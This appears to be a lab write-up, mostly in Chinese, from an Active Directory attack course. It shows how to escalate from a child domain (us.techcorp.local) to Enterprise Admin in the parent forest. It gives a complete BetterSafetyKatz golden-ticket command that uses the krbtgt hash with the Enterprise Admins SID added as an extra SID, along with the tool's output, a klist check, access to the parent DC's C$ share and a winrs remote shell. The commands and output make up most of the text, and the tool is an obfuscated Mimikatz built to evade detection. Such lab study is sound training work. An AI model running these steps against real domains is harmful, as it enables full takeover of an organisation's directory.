Task
•  Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, techcorp.local using the krbtgt hash of us.techcorp.local.

这章主要是用krbtgt的身份跨域,使用这个方法还可以免除申请tgt这一步，因为所有ticket都是krbtgt签发的

1. 起一个krbtgt的session

```
PS C:\Windows\system32> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   JVNZRH6G 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "C7IY1Y3AAQVPMBXYT14" - (JT4V3)
 ## / \ ##  /*** DLVTTW3OSUZW1D `J755DVZVF2` ( IOB70J71@J755DVZVF2.com )
 ## \ / ##       > https://blog.J755DVZVF2.com/JVNZRH6G
 '## v ##'       7IXB3RKJ5IWVUN1             ( 64K46DHFHGW7AZZKUHKR30SY )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

JVNZRH6G(commandline) # kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2781415573-3701854478-2406986946-519 ;
OWT13IWKey: b0975ae49f441adc6b024ad238935af5 - rc4_hmac_nt
Lifetime  : 11/3/2022 11:38:13 PM ; 10/31/2032 11:38:13 PM ; 10/31/2032 11:38:13 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

JVNZRH6G(commandline) # exit
Bye!
```

klist查看
```
PS C:\Windows\system32> klist

Current LogonId is 0:0xbdbd28

Cached Tickets: (2)

#0>     Client: Administrator @ us.techcorp.local
        Server: krbtgt/us.techcorp.local @ us.techcorp.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 11/3/2022 23:38:13 (local)
        End Time:   10/31/2032 23:38:13 (local)
        Renew Time: 10/31/2032 23:38:13 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

2. 现在可以直接查看父域DC的文件系统

```
PS C:\Windows\system32> dir \\techcorp-dc.techcorp.local\c$


    Directory: \\techcorp-dc.techcorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/10/2019   9:00 AM                ExchangeSetupLogs
d-----        12/7/2020   2:51 AM                PerfLogs
d-r---         1/6/2021  12:49 AM                Program Files
d-----        7/17/2019  11:02 PM                Program Files (x86)
d-----        7/25/2022   4:11 AM                Transcripts
d-r---        7/18/2019   9:48 AM                Users
d-----        5/22/2022   3:16 AM                Windows

```

3. 横向
```
PS C:\Windows\system32> winrs -r:techcorp-dc cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.US>hostname
hostname
Techcorp-DC

C:\Users\Administrator.US>whoami
whoami
us\administrator
```